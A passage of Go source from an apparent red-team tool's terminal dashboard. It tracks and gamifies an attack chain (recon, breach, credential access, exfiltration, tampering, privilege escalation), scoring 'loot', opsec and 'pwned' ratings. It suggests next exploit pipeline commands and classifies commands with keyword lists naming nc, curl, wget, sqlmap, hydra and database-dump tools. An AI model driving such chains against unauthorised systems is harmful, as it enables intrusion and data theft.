		access := hasCommandMatch(commands, "sqlmap") || hasCommandMatch(commands, "ffuf") || hasCommandMatch(commands, "gobuster")
		priv := hasCommandMatch(commands, "hydra") || hasCommandMatch(commands, "john") || hasCommandMatch(commands, "hashcat")
		objective := len(loot) > 0
		reporting := hasCommandMatch(commands, "telemetryctl.py snapshot")
		lines := []string{
			fmt.Sprintf("%s RECON", statusBadge(ternary(recon, "done", "idle"))),
			fmt.Sprintf("%s ACCESS", statusBadge(ternary(access, "done", "idle"))),
			fmt.Sprintf("%s PRIV", statusBadge(ternary(priv, "done", "idle"))),
			fmt.Sprintf("%s OBJECTIVE", statusBadge(ternary(objective, "done", "idle"))),
			fmt.Sprintf("%s EVIDENCE", statusBadge(ternary(reporting, "done", "idle"))),
		}
		return wrap(strings.Join(lines, " | "), width)
	}
}

func modeOperatorProfile(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		return "INVESTIGATIVE JOURNALIST"
	case "onchain":
		return "ONCHAIN AUDITOR"
	case "coop":
		return "CO-OP C2 OPERATOR"
	default:
		return "RED TEAM OPERATOR"
	}
}

func modeRunbook(mode, targetURL, osintSeed, onchainTarget, network string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		seed := strings.TrimSpace(osintSeed)
		if seed == "" {
			seed = targetHostFromURL(targetURL)
		}
		if seed == "" {
			seed = "example.com"
		}
		steps := []string{
			"1) osint-seed-harvest " + seed + " 200",
			"2) run BBOT/SpiderFoot deep pass",
			"3) recon-ng module chain + rengine status",
		}
		return wrap(strings.Join(steps, " | "), width)
	case "onchain":
		target := strings.TrimSpace(onchainTarget)
		if target == "" {
			target = "0x..."
		}
		steps := []string{
			"1) onchain-rpc-check " + network,
			"2) onchain-address-flow " + target + " " + network + " 50000",
			"3) slither/mythril then echidna/medusa/halmos",
		}
		return wrap(strings.Join(steps, " | "), width)
	case "coop":
		steps := []string{
			"1) launch CALDERA + status check",
			"2) list agents + operations (C2 health)",
			"3) save co-op report artifact for shared evidence",
		}
		return wrap(strings.Join(steps, " | "), width)
	default:
		return operatorRunbook(targetURL, commands, findings, loot, width)
	}
}

func modeNextOps(mode string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		lines := []string{
			"if input missing -> set seed in CTRL/TARGET",
			"if discovery missing -> run deep bbot/spiderfoot",
			"if reporting missing -> snapshot evidence bundle",
		}
		return wrap(strings.Join(lines, " | "), width)
	case "onchain":
		lines := []string{
			"if rpc missing -> onchain-rpc-check",
			"if flow missing -> onchain-address-flow",
			"if audit missing -> slither/mythril then fuzzers",
		}
		return wrap(strings.Join(lines, " | "), width)
	case "coop":
		lines := []string{
			"if c2 down -> run coop-caldera-up",
			"if visibility missing -> pull agents + operations",
			"if sharing needed -> run coop-caldera-op-report",
		}
		return wrap(strings.Join(lines, " | "), width)
	default:
		s := deriveChainSnapshot(commands, findings, loot)
		switch {
		case !s.Recon:
			return "next :: surface-map and web-enum to complete recon compartment."
		case !s.Breach:
			return "next :: api-probe or initial-exploit to move into breach compartment."
		case !s.Access:
			return "next :: privilege/access validation and controlled auth pivots."
		case !s.Exfil:
			return "next :: evidence pull from compromised data paths (files/db)."
		case !s.Tamper:
			return "next :: integrity impact checks (low-noise where possible)."
		default:
			return "all major compartments covered :: snapshot and report or continue depth operations."
		}
	}
}

func countOnchainFlowArtifacts(loot []lootEntry) int {
	count := 0
	for _, item := range loot {
		meta := strings.ToLower(item.Name + " " + item.Source + " " + item.Preview)
		if strings.Contains(meta, "address-flow") || strings.Contains(meta, "4d") {
			count++
		}
	}
	return count
}

type chainSnapshot struct {
	Recon   bool
	Breach  bool
	Access  bool
	Exfil   bool
	Tamper  bool
	PrivEsc bool
}

func deriveChainSnapshot(commands []commandEntry, findings []findingEntry, loot []lootEntry) chainSnapshot {
	lootHas := func(kind string) bool {
		for _, item := range loot {
			if strings.EqualFold(strings.TrimSpace(item.Kind), kind) {
				return true
			}
		}
		return false
	}
	hasPhase := func(phase string) bool {
		for _, cmd := range commands {
			if strings.EqualFold(strings.TrimSpace(cmd.Phase), phase) {
				return true
			}
		}
		return false
	}
	hasAnyFinding := func(markers ...string) bool {
		for _, item := range findings {
			meta := strings.ToLower(item.Title + " " + item.Evidence + " " + item.Impact + " " + item.Endpoint)
			for _, marker := range markers {
				if strings.Contains(meta, strings.ToLower(marker)) {
					return true
				}
			}
		}
		return false
	}
	hasAnyCommand := func(markers ...string) bool {
		for _, cmd := range commands {
			meta := strings.ToLower(cmd.Tool + " " + cmd.Command + " " + cmd.Phase)
			for _, marker := range markers {
				if strings.Contains(meta, strings.ToLower(marker)) {
					return true
				}
			}
		}
		return false
	}
	lootCountByKinds := func(kinds ...string) int {
		count := 0
		for _, item := range loot {
			kind := strings.ToLower(strings.TrimSpace(item.Kind))
			for _, needle := range kinds {
				if kind == strings.ToLower(strings.TrimSpace(needle)) {
					count++
					break
				}
			}
		}
		return count
	}
	return chainSnapshot{
		Recon: len(commands) > 0 || len(findings) > 0,
		Breach: hasAnyFinding("auth bypass", "authentication", "injection", "rce", "sqli", "xss") ||
			hasAnyCommand("initial-exploit", "api-probe", "sqlmap", "commix", "hydra", "auth") ||
			lootHas("token"),
		Access: hasAnyFinding("privilege", "access control", "unauthorized", "admin", "credential") ||
			hasAnyCommand("post-enum", "enum", "ldapsearch", "smb", "rpcclient") ||
			lootHas("credential") || lootHas("token") || lootHas("hash"),
		Exfil: lootCountByKinds("backup", "document", "binary", "token", "credential", "hash", "artifact", "database") > 0,
		Tamper: hasAnyFinding("tamper", "integrity", "modify", "destructive") ||
			hasAnyCommand(" put ", " patch ", " delete ", "full-chain"),
		PrivEsc: hasPhase("post-enum") || hasPhase("password") || hasPhase("privesc") ||
			hasAnyFinding("privesc", "privilege escalation") || hasAnyCommand("linpeas", "winpeas", "searchsploit"),
	}
}

func attackChainMissing(snapshot chainSnapshot) []string {
	switch {
	case !snapshot.Recon:
		return []string{"surface recon telemetry", "service or endpoint discovery"}
	case !snapshot.Breach:
		return []string{"working auth-bypass or exploit proof", "valid token/session artifact"}
	case !snapshot.Access:
		return []string{"privileged API/resource access proof", "credential extraction or role escalation"}
	case !snapshot.Exfil:
		return []string{"high-value artifact capture", "exported evidence in loot"}
	case !snapshot.Tamper:
		return []string{"integrity-impact demonstration", "before/after state snapshot"}
	case !snapshot.PrivEsc:
		return []string{"post-foothold host enum", "privilege-escalation path validation"}
	default:
		return nil
	}
}

func attackChainBoard(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	s := deriveChainSnapshot(commands, findings, loot)
	stages := []struct {
		name string
		ok   bool
	}{
		{"RECON", s.Recon},
		{"BREACH", s.Breach},
		{"ACCESS", s.Access},
		{"EXFIL", s.Exfil},
		{"TAMPER", s.Tamper},
		{"PRIVESC", s.PrivEsc},
	}
	lines := make([]string, 0, len(stages)+2)
	for _, stage := range stages {
		lines = append(lines, fmt.Sprintf("%s %s", statusBadge(ternary(stage.ok, "done", "idle")), stage.name))
	}
	missing := attackChainMissing(s)
	if len(missing) > 0 {
		lines = append(lines, "missing :: "+strings.Join(missing, " + "))
	} else {
		lines = append(lines, "chain coverage :: all major stages have evidence")
	}
	return wrap(strings.Join(lines, " | "), width)
}

func progressBar(percent, slots int) string {
	if slots <= 0 {
		slots = 12
	}
	if percent < 0 {
		percent = 0
	}
	if percent > 100 {
		percent = 100
	}
	filled := (percent*slots + 99) / 100
	if filled > slots {
		filled = slots
	}
	if filled < 0 {
		filled = 0
	}
	return "[" + strings.Repeat("█", filled) + strings.Repeat("░", slots-filled) + fmt.Sprintf("] %d%%", percent)
}

func exploitNoiseScore(commands []commandEntry) int {
	noisyTools := []string{"nmap", "nikto", "nuclei", "sqlmap", "ffuf", "gobuster", "hydra", "medusa", "msfconsole", "wfuzz", "commix"}
	noise := 0
	for _, cmd := range commands {
		meta := strings.ToLower(strings.TrimSpace(cmd.Tool + " " + cmd.Command))
		for _, tool := range noisyTools {
			if strings.Contains(meta, tool) {
				noise += 6
				break
			}
		}
		if strings.Contains(meta, " -x put ") || strings.Contains(meta, " -x patch ") || strings.Contains(meta, " -x delete ") {
			noise += 10
		}
	}
	if noise > 100 {
		return 100
	}
	return noise
}

func exploitMissionMetrics(commands []commandEntry, findings []findingEntry, loot []lootEntry) exploitMissionStats {
	snap := deriveChainSnapshot(commands, findings, loot)
	done := 0
	for _, stage := range []bool{snap.Recon, snap.Breach, snap.Access, snap.Exfil, snap.Tamper, snap.PrivEsc} {
		if stage {
			done++
		}
	}
	progress := (done * 100) / 6
	if progress > 100 {
		progress = 100
	}
	severityRisk := 0
	for _, finding := range findings {
		switch strings.ToLower(strings.TrimSpace(finding.Severity)) {
		case "critical":
			severityRisk += 20
		case "high":
			severityRisk += 12
		case "medium":
			severityRisk += 6
		case "low":
			severityRisk += 3
		}
	}
	if severityRisk > 70 {
		severityRisk = 70
	}
	exploitability := 0
	if hasFindingMatch(findings, "sql") || hasFindingMatch(findings, "sqli") || hasFindingMatch(findings, "rce") || hasFindingMatch(findings, "command injection") {
		exploitability += 25
	}
	if hasFindingMatch(findings, "auth bypass") || hasFindingMatch(findings, "broken authentication") || hasLootMatch(loot, "token") {
		exploitability += 18
	}
	if hasLootMatch(loot, "credential") || hasLootMatch(loot, "hash") {
		exploitability += 15
	}
	if hasLootMatch(loot, ".db") || hasLootMatch(loot, "database") || hasLootMatch(loot, "mysql") || hasLootMatch(loot, "postgres") {
		exploitability += 20
	}
	if hasLootMatch(loot, "flag") {
		exploitability += 20
	}
	if exploitability > 100 {
		exploitability = 100
	}
	noise := exploitNoiseScore(commands)
	risk := severityRisk + (exploitability*3)/10 + noise/5
	if risk > 100 {
		risk = 100
	}
	health := 100 - risk
	if health < 0 {
		health = 0
	}
	return exploitMissionStats{
		DoneStages:     done,
		ProgressPct:    progress,
		RiskScore:      risk,
		HealthScore:    health,
		Exploitability: exploitability,
		NoiseScore:     noise,
	}
}

func opsecMeter(score int) string {
	if score < 0 {
		score = 0
	}
	if score > 100 {
		score = 100
	}
	marker := "LOW"
	glyph := "(._.)"
	if score >= 70 {
		marker = "HIGH"
		glyph = "(!!!)"
	} else if score >= 40 {
		marker = "MED"
		glyph = "(! !)"
	}
	return fmt.Sprintf("%s %s %s", glyph, progressBar(score, 10), marker)
}

func exploitMissionHUDStrip(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	stats := exploitMissionMetrics(commands, findings, loot)
	snap := deriveChainSnapshot(commands, findings, loot)
	frame := []string{"⠁", "⠂", "⠄", "⠂"}[int((time.Now().UnixNano()/220_000_000)%4)]
	stage := func(name string, done bool) string {
		if done {
			return lipgloss.NewStyle().Foreground(lipgloss.Color("42")).Bold(true).Render("[✓]" + name)
		}
		return "[" + frame + "]" + name
	}
	stages := strings.Join([]string{
		stage("RECON", snap.Recon),
		stage("BREACH", snap.Breach),
		stage("ACCESS", snap.Access),
		stage("EXFIL", snap.Exfil),
		stage("TAMPER", snap.Tamper),
		stage("PRIV", snap.PrivEsc),
	}, " ")
	return strings.Join([]string{
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("mission hud"),
		wrap(stages, width),
		wrap("progress "+progressBar(stats.ProgressPct, 12)+" | risk "+fmt.Sprintf("%d", stats.RiskScore)+" | health "+fmt.Sprintf("%d", stats.HealthScore)+" | exploit "+fmt.Sprintf("%d", stats.Exploitability), width),
	}, "\n")
}

func exploitAchievements(commands []commandEntry, findings []findingEntry, loot []lootEntry) []exploitAchievement {
	snap := deriveChainSnapshot(commands, findings, loot)
	stats := exploitMissionMetrics(commands, findings, loot)
	success, fail := 0, 0
	for _, cmd := range commands {
		switch strings.ToLower(strings.TrimSpace(cmd.Status)) {
		case "ok", "done", "complete", "completed":
			success++
		case "error", "failed", "fail":
			fail++
		}
	}
	evidenceCaptured := hasCommandMatch(commands, "telemetryctl.py snapshot") || hasLootMatch(loot, "snapshot")
	allStages := snap.Recon && snap.Breach && snap.Access && snap.Exfil && snap.Tamper && snap.PrivEsc
	return []exploitAchievement{
		{ID: "surface-mapper", Name: "Surface Mapper", Hint: "Complete recon and route discovery baseline.", Points: 10, Unlocked: snap.Recon},
		{ID: "breach-confirmed", Name: "Breach Confirmed", Hint: "Demonstrate exploit or auth-boundary break.", Points: 15, Unlocked: snap.Breach},
		{ID: "pivot-proof", Name: "Privileged Pivot", Hint: "Prove privileged/API access with usable creds or token.", Points: 20, Unlocked: snap.Access},
		{ID: "data-exposure", Name: "Data Exposure", Hint: "Capture high-value artifacts or dataset extracts.", Points: 20, Unlocked: snap.Exfil},
		{ID: "integrity-impact", Name: "Integrity Impact", Hint: "Show controlled state change with evidence.", Points: 25, Unlocked: snap.Tamper},
		{ID: "privesc-path", Name: "Escalation Path", Hint: "Validate privilege-escalation pathing post foothold.", Points: 20, Unlocked: snap.PrivEsc},
		{ID: "low-noise", Name: "Low-Noise Operator", Hint: "Keep noise <=35 while progressing access.", Points: 15, Unlocked: stats.NoiseScore <= 35 && (snap.Breach || snap.Access)},
		{ID: "evidence-discipline", Name: "Evidence Discipline", Hint: "Capture operation snapshots/replay evidence.", Points: 10, Unlocked: evidenceCaptured},
		{ID: "full-chain", Name: "Chain Dominance", Hint: "Complete all chain stages in one operation context.", Points: 40, Unlocked: allStages},
		{ID: "steady-exec", Name: "Steady Execution", Hint: "Maintain positive success/fail command ratio.", Points: 10, Unlocked: success > 0 && success >= fail},
	}
}

func exploitAchievementTotals(items []exploitAchievement) (unlocked, total, points int) {
	total = len(items)
	for _, item := range items {
		if item.Unlocked {
			unlocked++
			points += item.Points
		}
	}
	return unlocked, total, points
}

func exploitAchievementBoard(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	items := exploitAchievements(commands, findings, loot)
	unlocked, total, points := exploitAchievementTotals(items)
	lines := []string{
		metricLine("unlocked", fmt.Sprintf("%d/%d", unlocked, total)),
		metricLine("score", fmt.Sprintf("%d", points)),
	}
	nextHint := ""
	for _, item := range items {
		marker := statusBadge(ternary(item.Unlocked, "done", "idle"))
		lines = append(lines, fmt.Sprintf("%s %s (+%d)", marker, item.Name, item.Points))
		if nextHint == "" && !item.Unlocked {
			nextHint = item.Hint
		}
		if len(lines) >= 8 {
			break
		}
	}
	if nextHint != "" {
		lines = append(lines, "next unlock :: "+nextHint)
	}
	return wrap(strings.Join(lines, " | "), width)
}

func exploitGamificationMechanics(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	stats := exploitMissionMetrics(commands, findings, loot)
	success, fail := 0, 0
	for _, cmd := range commands {
		switch strings.ToLower(strings.TrimSpace(cmd.Status)) {
		case "ok", "done", "complete", "completed":
			success++
		case "error", "failed", "fail":
			fail++
		}
	}
	totalOutcomes := success + fail
	successRate := 50
	if totalOutcomes > 0 {
		successRate = (success * 100) / totalOutcomes
	}
	reward := (stats.Exploitability*6)/10 + stats.DoneStages*8 + min(20, len(loot)*2) + min(20, countSeverity(findings, "critical")*6+countSeverity(findings, "high")*3)
	risk := (stats.RiskScore*7)/10 + (stats.NoiseScore*3)/10 + min(20, fail*4)
	momentum := (successRate*50)/100 + stats.ProgressPct/2 + max(0, 20-fail*3)
	reward = clamp(reward, 0, 100)
	risk = clamp(risk, 0, 100)
	momentum = clamp(momentum, 0, 100)
	decision := reward - risk + momentum/4
	decision = clamp(decision, 0, 100)
	lines := []string{
		metricLine("reward", fmt.Sprintf("%d/100", reward)),
		metricLine("risk", fmt.Sprintf("%d/100", risk)),
		metricLine("momentum", fmt.Sprintf("%d/100", momentum)),
		metricLine("decision score", fmt.Sprintf("%d/100", decision)),
		metricLine("score bar", progressBar(decision, 10)),
	}
	return wrap(strings.Join(lines, " | "), width)
}

func scoreGrade(score int) string {
	score = clamp(score, 0, 100)
	switch {
	case score >= 90:
		return "S"
	case score >= 80:
		return "A"
	case score >= 70:
		return "B"
	case score >= 60:
		return "C"
	case score >= 45:
		return "D"
	default:
		return "E"
	}
}

func ratingDeltasFromMeta(meta string) (int, int, string) {
	match := func(terms ...string) bool {
		meta = strings.ToLower(strings.TrimSpace(meta))
		for _, term := range terms {
			if strings.Contains(meta, strings.ToLower(strings.TrimSpace(term))) {
				return true
			}
		}
		return false
	}
	hasNetwork := match("http://", "https://", "curl ", "wget ", "nc ", "ncat ", "ssh ", "ftp ", "smb", "ldap", "rpc", "dns")
	hasAuth := match("authorization", "bearer", "token", "jwt", " -u ", "username=", "password", "login", "auth", "apikey", "api-key", "cookie")
	hasMutation := match(" put ", " patch ", " delete ", " update ", " insert ", " drop ", " alter ", " create ", "-x put", "-x patch", "-x delete", "--data ", " --data ")
	hasAggressive := match("brute", "spray", "fuzz", "burst", "wordlist", "crawl=", "threads", "parallel", "xargs -p", "for ")
	hasExploit := match("exploit", "payload", "inject", "sqli", "rce", "xss", "ssrf", "traversal", "idor", "command injection")
	hasExfil := match("dump", "backup", "exfil", "export", "download", "artifact", "collection", "record", "snapshot", "pg_dump", "mysqldump", "sqlite3")
	hasDiscovery := match("recon", "enumeration", "enum", "discover", "openapi", "surface-map", "web-enum", "api-probe", "scan", "probe", "fingerprint", "list")
	hasPassive := match("curl -ssi", "curl -ss", "curl -i", "head ", "options ", "show", "inspect", "cat ", "jq ", "sed -n", "grep ", "awk ")
	switch {
	case strings.TrimSpace(meta) == "":
		return 0, 0, "neutral"
	case match(
		"targetctl.py set", "targetctl.py info", "targetctl.py start",
		"docker compose up", "docker compose down", "h3retik up", "h3retik down",
		"control-target", "target:manual", "target:inner", "target:onchain", "target:osint",
		"doctor", "stack-check", "switch mode", "mode ->",
	):
		return 0, 0, "control"
	case match("telemetryctl.py snapshot", "telemetryctl.py show", "snapshot", "report export"):
		return 1, 1, "evidence"
	case hasMutation:
		return 7, 9, "mutation"
	case hasAuth && hasAggressive:
		return 9, 10, "auth-attack"
	case hasExploit && hasNetwork:
		return 8, 7, "exploit"
	case match("privesc", "post-enum", "lateral-pivot", "full-escalation") || (hasNetwork && match("smb", "ldap", "rpc", "ssh")):
		return 7, 6, "pivot"
	case hasExfil:
		return 6, 5, "exfil"
	case hasNetwork && hasDiscovery:
		return 4, 4, "discovery"
	case hasNetwork && hasPassive:
		return 2, 1, "passive"
	default:
		return 3, 3, "general"
	}
}

func commandOpsecScore(cmd commandEntry) int {
	_, opsecDelta, _ := ratingDeltasFromMeta(cmd.Tool + " " + cmd.Command)
	return clamp(opsecDelta*10, 0, 100)
}

func exploitCampaignRatings(commands []commandEntry, findings []findingEntry, loot []lootEntry) exploitCampaignRating {
	snap := deriveChainSnapshot(commands, findings, loot)
	traceSum := 0
	noisyActions := 0
	mutatingActions := 0
	authActions := 0
	failures := 0
	repeats := 0
	commandSeen := map[string]int{}
	for _, cmd := range commands {
		meta := strings.ToLower(strings.TrimSpace(cmd.Command + " " + cmd.Tool))
		_, opsecDelta, class := ratingDeltasFromMeta(meta)
		trace := opsecDelta
		if class == "discovery" || class == "auth-attack" || class == "exploit" {
			noisyActions++
		}
		if class == "mutation" {
			mutatingActions++
		}
		if class == "auth-attack" || strings.Contains(meta, "authorization: bearer") || strings.Contains(meta, " -u ") || strings.Contains(meta, "login") || strings.Contains(meta, "auth") || strings.Contains(meta, "token") {
			authActions++
		}
		switch strings.ToLower(strings.TrimSpace(cmd.Status)) {
		case "error", "failed", "fail":
			failures++
			trace += 2
		}
		signature := strings.ToLower(strings.TrimSpace(cmd.Tool + "::" + cmd.Command))
		if signature != "" {
			commandSeen[signature]++
			if commandSeen[signature] > 1 {
				repeats++
				trace += 1
			}
		}
		traceSum += trace
	}
	volumePenalty := 0
	if len(commands) > 6 {
		volumePenalty = min(12, (len(commands)-6)/2)
	}
	traceBurden := (traceSum * 3) / 4
	traceBurden += volumePenalty + min(8, failures*2) + min(8, repeats)
	traceBurden = clamp(traceBurden, 0, 100)
	opsecScore := 100 - traceBurden

	pwnedScore := 0
	if snap.Recon {
		pwnedScore += 12
	}
	if snap.Breach {
		pwnedScore += 20
	}
	if snap.Access {
		pwnedScore += 22
	}
	if snap.Exfil {
		pwnedScore += 18
	}
	if snap.Tamper {
		pwnedScore += 18
	}
	if snap.PrivEsc {
		pwnedScore += 10
	}
	if hasLootMatch(loot, "credential") || hasLootMatch(loot, "token") || hasLootMatch(loot, "hash") {
		pwnedScore += 4
	}
	if hasLootMatch(loot, "database") || hasLootMatch(loot, ".db") || hasLootMatch(loot, "collection") || hasLootMatch(loot, "record") {
		pwnedScore += 4
	}
	if hasLootMatch(loot, "artifact") || hasLootMatch(loot, "backup") || hasLootMatch(loot, "document") || hasLootMatch(loot, "binary") {
		pwnedScore += 3
	}
	pwnedScore += min(8, countSeverity(findings, "critical")*4)
	pwnedScore += min(5, countSeverity(findings, "high"))
	if snap.Tamper && hasFindingMatch(findings, "integrity") {
		pwnedScore += 2
	}
	pwnedScore = clamp(pwnedScore, 0, 100)

	return exploitCampaignRating{
		OpsecScore:      opsecScore,
		PwnedScore:      pwnedScore,
		TraceBurden:     traceBurden,
		NoisyActions:    noisyActions,
		MutatingActions: mutatingActions,
		AuthActions:     authActions,
	}
}

func exploitCampaignRatingsBoard(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	ratings := exploitCampaignRatings(commands, findings, loot)
	lines := []string{
		metricLine("opsec rating", fmt.Sprintf("%d/100 [%s] %s", ratings.OpsecScore, scoreGrade(ratings.OpsecScore), progressBar(ratings.OpsecScore, 8))),
		metricLine("pwned rating", fmt.Sprintf("%d/100 [%s] %s", ratings.PwnedScore, scoreGrade(ratings.PwnedScore), progressBar(ratings.PwnedScore, 8))),
	}
	return wrap(strings.Join(lines, " | "), width)
}

func exploitActionOpsecBoard(commands []commandEntry, width int) string {
	if len(commands) == 0 {
		return "no actions executed yet"
	}
	lines := []string{}
	limit := min(6, len(commands))
	for i := 0; i < limit; i++ {
		cmd := commands[i]
		traceScore := commandOpsecScore(cmd)
		opsecScore := clamp(100-traceScore, 0, 100)
		lines = append(lines, fmt.Sprintf("%s %3d %s", scoreGrade(opsecScore), opsecScore, truncate(cmd.Tool+" :: "+cmd.Command, max(24, width-18))))
	}
	return strings.Join(lines, "\n")
}

func actionOpsecScore(action controlAction) int {
	_, opsecDelta, _ := ratingDeltasFromMeta(action.Label + " " + action.Command + " " + action.KaliShell + " " + action.Group + " " + action.ActionID)
	return clamp(opsecDelta*10, 0, 100)
}

func actionEffectiveOpsecScore(action controlAction, commands []commandEntry) int {
	predicted := actionOpsecScore(action)
	needle := strings.ToLower(strings.TrimSpace(action.ActionID))
	if needle == "" || len(commands) == 0 {
		return predicted
	}
	observedSum := 0
	observedCount := 0
	for _, cmd := range commands {
		if !commandMatchesAction(cmd, needle) {
			continue
		}
		observedSum += commandOpsecScore(cmd)
		observedCount++
	}
	if observedCount == 0 {
		return predicted
	}
	observed := observedSum / observedCount
	weightObserved := 60
	if observedCount >= 3 {
		weightObserved = 70
	}
	weightPredicted := 100 - weightObserved
	return clamp((predicted*weightPredicted+observed*weightObserved)/100, 0, 100)
}

func exploitNextBestAction(commands []commandEntry, findings []findingEntry, loot []lootEntry, targetURL string) (string, int) {
	target := strings.TrimSpace(targetURL)
	if target == "" {
		return "set target url from CTRL TARGET before firing exploit pipelines", 95
	}
	s := deriveChainSnapshot(commands, findings, loot)
	switch {
	case !s.Recon:
		return "python3 ./scripts/security_pipeline.py --target " + target + " --pipeline surface-map", 88
	case !s.Breach:
		return "python3 ./scripts/security_pipeline.py --target " + target + " --pipeline api-probe", 83
	case !s.Access:
		return "python3 ./scripts/security_pipeline.py --target " + target + " --pipeline initial-exploit", 80
	case !s.Exfil:
		return "python3 ./scripts/security_pipeline.py --target " + target + " --pipeline web-enum", 78
	case !s.PrivEsc:
		return "python3 ./scripts/security_pipeline.py --target " + target + " --pipeline privesc", 74
	default:
		return "python3 ./scripts/telemetryctl.py snapshot --name exploit-final", 70
	}
}

func nextBestActionCard(commands []commandEntry, findings []findingEntry, loot []lootEntry, targetURL string, width int) string {
	command, confidence := exploitNextBestAction(commands, findings, loot, targetURL)
	lines := []string{
		"+---------------- NEXT ACTION ----------------+",
		"| mission AI: select highest-yield chain step |",
		"| confidence: " + fmt.Sprintf("%d%%", confidence) + strings.Repeat(" ", max(0, 13-len(fmt.Sprintf("%d%%", confidence)))) + "                      |",
		"+---------------------------------------------+",
		"> " + truncate(command, max(24, width-4)),
	}
	return wrap(strings.Join(lines, "\n"), width)
}

func exploitAttackDegreeMap(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	stats := exploitMissionMetrics(commands, findings, loot)
	db := ternary(hasLootMatch(loot, "database") || hasLootMatch(loot, "mysql") || hasLootMatch(loot, "postgres") || hasLootMatch(loot, ".db"), "UNLOCKED", "LOCKED")
	creds := ternary(hasLootMatch(loot, "credential") || hasLootMatch(loot, "token") || hasLootMatch(loot, "hash"), "UNLOCKED", "LOCKED")
	files := ternary(hasLootMatch(loot, "artifact") || hasLootMatch(loot, "file") || hasLootMatch(loot, ".json") || hasLootMatch(loot, ".txt"), "UNLOCKED", "LOCKED")
	return strings.Join([]string{
		metricLine("unlock tiers", fmt.Sprintf("S%d/6", stats.DoneStages)),
		metricLine("unlocks", "DB:"+db+" | CREDS:"+creds+" | FILES:"+files),
		metricLine("state", ternary(stats.RiskScore >= 70, "high-impact compromise path open", ternary(stats.RiskScore >= 40, "escalating compromise posture", "early compromise posture"))),
	}, "\n")
}

func missionBoard(state stateFile, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	target := valueOr(state.TargetName, "Target")
	s := deriveChainSnapshot(commands, findings, loot)
	stats := exploitMissionMetrics(commands, findings, loot)
	goal := "Establish breach, prove impact, preserve evidence."
	progress := []string{}
	if s.Recon {
		progress = append(progress, "surface mapped")
	}
	if s.Breach {
		progress = append(progress, "auth boundary crossed")
	}
	if s.Access {
		progress = append(progress, "privileged access proven")
	}
	if s.Exfil {
		progress = append(progress, "loot exfiltrated")
	}
	if s.Tamper {
		progress = append(progress, "integrity tamper demonstrated")
	}
	if len(progress) == 0 {
		progress = append(progress, "no mission checkpoints yet")
	}
	lines := []string{
		"objective :: " + target + " black-box compromise",
		"goal :: " + goal,
		"progress :: " + strings.Join(progress, ", "),
		"progress bar :: " + progressBar(stats.ProgressPct, 10),
		"risk/health :: " + fmt.Sprintf("%d/100", stats.RiskScore) + " :: " + fmt.Sprintf("%d/100", stats.HealthScore),
		"exploitability :: " + fmt.Sprintf("%d/100", stats.Exploitability),
	}
	missing := attackChainMissing(s)
	if len(missing) > 0 {
		lines = append(lines, "next requirement :: "+strings.Join(missing, " + "))
	}
	return wrap(strings.Join(lines, " | "), width)
}

func sessionLedger(loot []lootEntry, width int) string {
	lines := []string{}
	for _, item := range loot {
		kind := strings.ToLower(strings.TrimSpace(item.Kind))
		if kind != "token" && kind != "credential" && kind != "hash" {
			continue
		}
		lines = append(lines, fmt.Sprintf("%s %s :: %s", kindBadge(item.Kind), truncate(item.Name, 30), truncate(item.Source, 36)))
		if len(lines) >= 8 {
			break
		}
	}
	if len(lines) == 0 {
		return "no credential/session artifacts captured yet"
	}
	return wrap(strings.Join(lines, " | "), width)
}

func evidencePipelineSummary(root string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	ok, fail := 0, 0
	for _, cmd := range commands {
		if strings.EqualFold(strings.TrimSpace(cmd.Status), "ok") {
			ok++
		} else if strings.EqualFold(strings.TrimSpace(cmd.Status), "error") || strings.EqualFold(strings.TrimSpace(cmd.Status), "failed") {
			fail++
		}
	}
	replays := len(discoverReplayRuns(root))
	artifactLike := 0
	for _, item := range loot {
		switch strings.ToLower(strings.TrimSpace(item.Kind)) {
		case "artifact", "backup", "document", "binary", "collection":
			artifactLike++
		}
	}
	lines := []string{
		metricLine("command outcomes", fmt.Sprintf("ok=%d fail=%d", ok, fail)),
		metricLine("findings linked", fmt.Sprintf("%d", len(findings))),
		metricLine("artifact-like loot", fmt.Sprintf("%d", artifactLike)),
		metricLine("replay snapshots", fmt.Sprintf("%d", replays)),
	}
	if replays == 0 {
		lines = append(lines, "action :: snapshot telemetry from CTRL history")
	}
	return strings.Join(lines, "\n")
}

func executionControlView(commands []commandEntry, controlBusy bool, width int) string {
	total := len(commands)
	ok, fail := 0, 0
	var durationTotal int
	for _, cmd := range commands {
		durationTotal += max(0, cmd.DurationMS)
		switch strings.ToLower(strings.TrimSpace(cmd.Status)) {
		case "ok", "complete", "completed", "done":
			ok++
		case "error", "failed", "fail":
			fail++
		}
	}
	avg := 0
	if total > 0 {
		avg = durationTotal / total
	}
	lines := []string{
		metricLine("jobs observed", fmt.Sprintf("%d", total)),
		metricLine("success/fail", fmt.Sprintf("%d/%d", ok, fail)),
		metricLine("avg duration", fmt.Sprintf("%dms", avg)),
		metricLine("operator busy", ternary(controlBusy, "yes", "no")),
	}
	return wrap(strings.Join(lines, " | "), width)
}

func targetGraphView(state stateFile, findings []findingEntry, loot []lootEntry, width int) string {
	host := valueOr(targetHostFromURL(state.TargetURL), "target-unset")
	lines := []string{
		"operator -> " + host,
	}
	if hasLootMatch(loot, "token") {
		lines = append(lines, host+" -> session(token) -> privileged route")
	}
	if hasLootMatch(loot, "credential") {
		lines = append(lines, host+" -> credentials -> auth/service reuse")
	}
	if hasLootMatch(loot, "collection") || hasLootMatch(loot, "record") || hasFindingMatch(findings, "tampering") || hasFindingMatch(findings, "integrity") {
		lines = append(lines, host+" -> mutable endpoint -> integrity impact")
	}
	count := 0
	for _, item := range loot {
		if !(strings.EqualFold(item.Kind, "endpoint") || strings.EqualFold(item.Kind, "path")) {
			continue
		}
